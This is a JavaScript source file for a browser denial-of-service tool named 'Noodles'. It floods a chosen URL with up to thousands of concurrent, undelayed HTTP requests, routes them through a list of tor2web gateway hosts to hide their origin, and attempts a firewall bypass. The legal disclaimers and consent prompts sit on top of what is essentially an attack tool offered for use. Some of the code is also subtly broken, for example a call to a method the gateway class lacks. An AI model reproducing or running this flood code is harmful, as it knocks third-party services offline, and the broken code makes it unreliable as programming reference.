// WARNING: This tool is for educational and security testing purposes ONLY.
// Unauthorized use is illegal and can result in severe penalties.
// The developers are NOT responsible for any misuse or damage caused by this tool.
// LOG ALL ACTIONS.

class Tor {
    constructor() {
        // UI and Core Setup (DO NOT MODIFY DIRECTLY)
        this.NoodlesDisclaimer = "Noodles Inc. is NOT responsible for unauthorized use. Unauthorized use is illegal. Use at your own risk.";
        this.initializeNoodles();
        this.logToConsole("Noodles: Tor.js loaded.");

        // HACKING-SPECIFIC CONFIGURATIONS (Modify with EXTREME CAUTION)
        this.aggressiveMode = confirm("Engage aggressive mode? WARNING: May increase detection risk.");
        this.bypassFirewalls = confirm("Attempt to bypass basic firewalls? ILLEGAL in most jurisdictions.");
        this.payloadMultiplier = parseInt(prompt("Enter payload multiplier (1-10, HIGHLY RISKY):") || 1);

        // Tor Gateway Management (DO NOT MODIFY DIRECTLY)
        this.torGateways = new TorGateways(this);
        this.torGateways.startGatewayMonitoring();

        // UI Customization
        this.applyColorScheme();
        this.createScanLines();
        this.createParticles();
    }

    // Initialization (Noodles Core)
    async initializeNoodles() {
        if (this.isNoodlesInitialized) return;
        if (confirm("WARNING: Noodles contains tools that can be used for ILLEGAL activities. Proceed ONLY if you understand the RISKS.")) {
            this.isNoodlesInitialized = true;
            this.logToConsole("Noodles initialized with user consent.");
            this.displayDisclaimer();
            this.setupDDoS();
        } else {
            this.closeSite();
        }
    }

    // Color Scheme (Dark Green, Purple, Dark Red, Dark Blue)
    applyColorScheme() {
        document.body.style.backgroundColor = '#000';
        document.body.style.color = '#0F0'; // Dark Green
        const elements = document.querySelectorAll('*');
        elements.forEach(element => {
            element.style.borderColor = '#800080'; // Purple
            element.style.boxShadow = '0 0 5px #00008B'; // Dark Blue
        });

        // Change links to dark red
        const links = document.querySelectorAll('a');
        links.forEach(link => {
            link.style.color = '#8B0000'; // Dark Red
        });
        this.logToConsole("ColorScheme: UI updated.");
    }

    // Scan Lines Effect (Dark Green)
    createScanLines() {
        const canvas = document.createElement('canvas');
        canvas.id = 'scanLinesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9999';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const drawScanLines = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.strokeStyle = 'rgba(0, 255, 0, 0.1)'; // Dark Green
            ctx.lineWidth = 0.5;
            for (let y = 0; y < canvas.height; y += 4) {
                ctx.beginPath();
                ctx.moveTo(0, y);
                ctx.lineTo(canvas.width, y);
                ctx.stroke();
            }
        };
        drawScanLines();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            drawScanLines();
        });
        this.logToConsole("Scan Lines: Active.");
    }

    // Particle Effect (Dark Purple)
    createParticles() {
        const canvas = document.createElement('canvas');
        canvas.id = 'particlesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9998';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const particles = [];
        const particleCount = 50;
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 3 + 1,
                speedX: Math.random() * 2 - 1,
                speedY: Math.random() * 2 - 1,
                color: `rgba(148,0,211,0.7)` // Dark Purple
            });
        }
        const drawParticles = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.fill();
                p.x += p.speedX;
                p.y += p.speedY;
                if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
                if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
            });
            requestAnimationFrame(drawParticles);
        };
        drawParticles();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        this.logToConsole("Particles: Active.");
    }

    // Logging (Noodles Core)
    logToConsole(message) {
        if (this.allActionsLogged) {
            console.log(`Noodles Log: ${message}`);
            this.noodlesLogs.push({ timestamp: new Date(), message: message });
        }
    }

    // DDoS Setup (HIGHLY DANGEROUS - Use ONLY for TESTING with PERMISSION)
    setupDDoS() {
        this.ddosConfig = {
            threads: parseInt(prompt("Enter number of threads for DDoS (default: 500, MAX: 2000):") || 500),
            duration: parseInt(prompt("Enter duration in seconds for DDoS (default: 30):") || 30),
            requestDelay: 0, // Delay between requests in milliseconds
            payloadSize: 1024 * this.payloadMultiplier, // Size of the payload in bytes - MODIFIED BY MULTIPLIER
            httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
            customHeaders: { 'X-Noodles-Attack': 'DDoS-TOR' }
        };
        this.logToConsole(`DDoS: Configured - Threads: ${this.ddosConfig.threads}, Duration: ${this.ddosConfig.duration}, Payload: ${this.ddosConfig.payloadSize}`);
    }

    // DDoS Attack (TOR-ROUTED - EXTREMELY ILLEGAL WITHOUT AUTHORIZATION)
    async startDDoS(url) {
        if (!url) {
            alert("DDoS: Please enter a valid URL.");
            return;
        }

        if (this.bypassFirewalls) {
            url = `http://webcache.googleusercontent.com/search?q=cache:${url}`;
            this.logToConsole("DDoS: Firewall bypass attempt initiated (RISKY).");
        }

        this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
        this.ddosAttackStartTime = new Date();

        let requestCount = 0;
        let endTime = Date.now() + (this.ddosConfig.duration * 1000);

        const attackThread = async () => {
            while (Date.now() < endTime) {
                try {
                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)];
                    // USE TOR GATEWAY HERE
                    const response = await this.torGateways.rawFetch(url, { method: method, headers: this.ddosConfig.customHeaders });

                    if (!response.ok) {
                        this.logToConsole(`DDoS: Request failed with status: ${response.status}`, 'warn');
                    }
                    requestCount++;
                } catch (error) {
                    this.logToConsole(`DDoS: Request error: ${error}`, 'error');
                }
                await this.delay(this.ddosConfig.requestDelay);
            }
        };

        this.ddosThreads = [];
        for (let i = 0; i < this.ddosConfig.threads; i++) {
            this.ddosThreads.push(attackThread());
        }

        await Promise.all(this.ddosThreads);
        this.ddosAttackEndTime = new Date();
        this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
        this.logToConsole(`DDoS: Attack completed. Total requests: ${requestCount} with ${this.ddosConfig.threads} threads.`);
    }

    // Tor-Routed Fetch (Core Function)
    async rawFetch(url, options = {}) {
        try {
            const response = await this.torGateways.fetchThroughGateway(url, options);
            return response;
        } catch (error) {
            this.logToConsole(`Raw fetch failed: ${error}`);
            throw error;
        }
    }

    // Attack Start/Stop (Noodles Core)
    startAttack(attackType, targetURL, config = {}) {
        this.activeAttackType = attackType;
        this.targetURL = targetURL;
        this.attackConfig = config;
        this.attackStartTime = new Date();
        this.logToConsole(`${attackType} attack started on ${targetURL} at ${this.attackStartTime.toISOString()} with config: ${JSON.stringify(config)}`);
    }

    endAttack(attackType, targetURL, config = {}) {
        this.attackEndTime = new Date();
        const duration = (this.attackEndTime - this.attackStartTime) / 1000;
        this.logToConsole(`${attackType} attack ended on ${targetURL} at ${this.attackEndTime.toISOString()} after ${duration} seconds with config: ${JSON.stringify(config)}`);
        this.activeAttackType = null;
        this.targetURL = null;
        this.attackConfig = {};
    }

    // UTILITIES (Noodles Core)
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    closeSite() {
        window.close();
    }

    displayDisclaimer() {
        alert(this.NoodlesDisclaimer);
    }
}

// TorGateways Class (Gateway Management)
class TorGateways {
    constructor(torInstance) {
        this.torInstance = torInstance;
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = 5;
        this.requestTimeout = 8000;
        this.gatewayBlacklistDuration = 60000;
        this.gatewayCheckEnabled = true;
        this.isCheckingGateways = false;
        this.gatewayCheckTimeout = 5000;
        this.startGatewayMonitoring();
    }

    startGatewayMonitoring() {
        if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        setInterval(() => {
            this.checkGateways();
        }, 60000);
        this.torInstance.logToConsole("Tor Gateways: Monitoring started.");
    }

    async checkGateways() {
        if (this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        this.torInstance.logToConsole("Tor Gateways: Checking...");
        for (const gateway of this.gateways) {
            if (!this.failedGateways.has(gateway)) {
                try {
                    const status = await this.checkGatewayStatus(gateway);
                    this.torInstance.logToConsole(`Tor Gateways: ${gateway} - ${status}`);
                } catch (error) {
                    this.torInstance.logToConsole(`Tor Gateways: Error checking ${gateway}: ${error}`);
                }
            }
        }
        this.isCheckingGateways = false;
        this.torInstance.logToConsole("Tor Gateways: Check complete.");
    }

    async checkGatewayStatus(gateway) {
        try {
            const response = await fetch(gateway, {
                method: 'GET',
                timeout: this.gatewayCheckTimeout,
                headers: { 'User-Agent': 'Noodles Gateway Checker' }
            });
            if (response.ok) {
                return "Online";
            } else {
                this.blacklistGateway(gateway);
                return `Offline (Status: ${response.status})`;
            }
        } catch (error) {
            this.blacklistGateway(gateway);
            return `Error: ${error}`;
        }
    }

    blacklistGateway(gateway) {
        this.failedGateways.add(gateway);
        setTimeout(() => {
            this.failedGateways.delete(gateway);
            this.torInstance.logToConsole(`Tor Gateways: ${gateway} removed from blacklist.`);
        }, this.gatewayBlacklistDuration);
        this.torInstance.logToConsole(`Tor Gateways: ${gateway} blacklisted.`);
    }

    getNextGateway() {
        let retries = 0;
        while (retries < this.maxRetries) {
            const gateway = this.gateways[this.currentIndex];
            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
            if (!this.failedGateways.has(gateway)) {
                return gateway;
            }
            retries++;
        }
        return null;
    }

    async fetchThroughGateway(url, options = {}) {
        const gateway = this.getNextGateway();
        if (!gateway) {
            throw new Error("No available Tor gateways.");
        }
        const torURL = `${gateway}/${url}`;
        try {
            const response = await fetch(torURL, options);
            if (!response.ok) {
                throw new Error(`Request failed with status: ${response.status}`);
            }
            return response;
        } catch (error) {
            this.torInstance.logToConsole(`Tor Gateways: ${gateway} failed: ${error}`);
            this.failedGateways.add(gateway);
            throw error;
        }
    }
}

window.Tor = Tor;